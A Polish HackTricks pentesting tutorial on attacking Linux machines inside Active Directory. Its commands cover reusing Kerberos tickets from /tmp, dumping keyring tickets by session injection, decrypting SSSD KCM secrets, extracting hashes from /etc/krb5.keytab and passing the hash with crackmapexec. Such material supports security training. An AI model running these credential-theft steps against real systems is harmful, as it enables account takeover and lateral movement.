# Linux Active Directory

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Linuxowy komputer może również znajdować się w środowisku Active Directory.

Linuxowy komputer w AD może **przechowywać różne bilety CCACHE w plikach. Te bilety można wykorzystać i nadużyć tak samo jak inne bilety kerberos**. Aby odczytać te bilety, musisz być właścicielem użytkownika biletu lub **rootem** wewnątrz maszyny.

## Wyliczanie

### Wyliczanie AD z poziomu linuxa

Jeśli masz dostęp do AD w systemie Linux (lub basha w systemie Windows), możesz spróbować [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn), aby wyliczyć AD.

Możesz również sprawdzić następującą stronę, aby dowiedzieć się **innych sposobów na wyliczanie AD z poziomu linuxa**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA to otwarte źródło **alternatywa** dla Microsoft Windows **Active Directory**, głównie dla środowisk **Unixowych**. Łączy ono kompletny **katalog LDAP** z MIT **Kerberos** Key Distribution Center do zarządzania podobnie jak Active Directory. Wykorzystując Dogtag **Certificate System** do zarządzania certyfikatami CA & RA, obsługuje **uwierzytelnianie wieloczynnikowe**, w tym karty inteligentne. Zintegrowany jest SSSD do procesów uwierzytelniania Unix. Dowiedz się więcej na ten temat:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Zabawa z biletami

### Pass The Ticket

Na tej stronie znajdziesz różne miejsca, w których można **znaleźć bilety kerberos wewnątrz hosta linuxowego**, a na następnej stronie możesz dowiedzieć się, jak przekształcić te formaty biletów CCache na Kirbi (format wymagany w systemie Windows) oraz jak przeprowadzić atak PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Ponowne wykorzystanie biletu CCACHE z /tmp

Pliki CCACHE to formaty binarne do **przechowywania poświadczeń Kerberos**, które zwykle są przechowywane z uprawnieniami 600 w `/tmp`. Te pliki można zidentyfikować po ich **formacie nazwy, `krb5cc_%{uid}`,** odpowiadającym UID użytkownika. Dla weryfikacji biletu uwierzytelniającego, zmienna środowiskowa `KRB5CCNAME` powinna być ustawiona na ścieżkę do żądanego pliku biletu, umożliwiając jego ponowne wykorzystanie.

Wyświetl aktualny bilet używany do uwierzytelniania za pomocą `env | grep KRB5CCNAME`. Format jest przenośny, a bilet można **ponownie wykorzystać, ustawiając zmienną środowiskową** za pomocą `export KRB5CCNAME=/tmp/ticket.ccache`. Format nazwy biletu Kerberos to `krb5cc_%{uid}`, gdzie uid to UID użytkownika.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Ponowne wykorzystanie biletów CCACHE z keyringu

**Bilety Kerberos przechowywane w pamięci procesu mogą być wyodrębnione**, zwłaszcza gdy ochrona ptrace na maszynie jest wyłączona (`/proc/sys/kernel/yama/ptrace_scope`). Przydatne narzędzie do tego celu można znaleźć pod adresem [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), które ułatwia wyodrębnianie poprzez wstrzykiwanie się do sesji i zrzucanie biletów do `/tmp`.

Aby skonfigurować i używać tego narzędzia, należy postępować zgodnie z poniższymi krokami:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ten proces będzie próbował wstrzyknąć się do różnych sesji, wskazując sukces poprzez przechowywanie wyodrębnionych biletów w `/tmp` z konwencją nazewnictwa `__krb_UID.ccache`.


### Ponowne wykorzystanie biletu CCACHE z SSSD KCM

SSSD przechowuje kopię bazy danych pod ścieżką `/var/lib/sss/secrets/secrets.ldb`. Odpowiadający klucz jest przechowywany jako ukryty plik pod ścieżką `/var/lib/sss/secrets/.secrets.mkey`. Domyślnie klucz jest tylko do odczytu, jeśli masz uprawnienia **root**.

Wywołanie \*\*`SSSDKCMExtractor` \*\* z parametrami --database i --key spowoduje analizę bazy danych i **odszyfrowanie sekretów**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Blob Kerberosa w pamięci podręcznej poświadczeń można przekonwertować na plik CCache Kerberosa**, który może zostać przekazany do Mimikatz/Rubeus.

### Ponowne wykorzystanie biletu CCACHE z keytabu
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Wyodrębnianie kont z pliku /etc/krb5.keytab

Klucze kont usługowych, niezbędne dla usług działających z uprawnieniami roota, są bezpiecznie przechowywane w plikach **`/etc/krb5.keytab`**. Te klucze, podobnie jak hasła dla usług, wymagają ścisłej poufności.

Aby sprawdzić zawartość pliku keytab, można użyć polecenia **`klist`**. Narzędzie to służy do wyświetlania szczegółów kluczy, w tym **NT Hash** do uwierzytelniania użytkownika, zwłaszcza gdy typ klucza jest identyfikowany jako 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Dla użytkowników Linuxa, **`KeyTabExtract`** oferuje funkcjonalność do wyodrębniania skrótu RC4 HMAC, który może być wykorzystany do ponownego użycia skrótu NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS, **`bifrost`** służy jako narzędzie do analizy plików keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Wykorzystując wyodrębnione informacje o koncie i haszu, można nawiązać połączenie z serwerami za pomocą narzędzi takich jak **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Odwołania
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
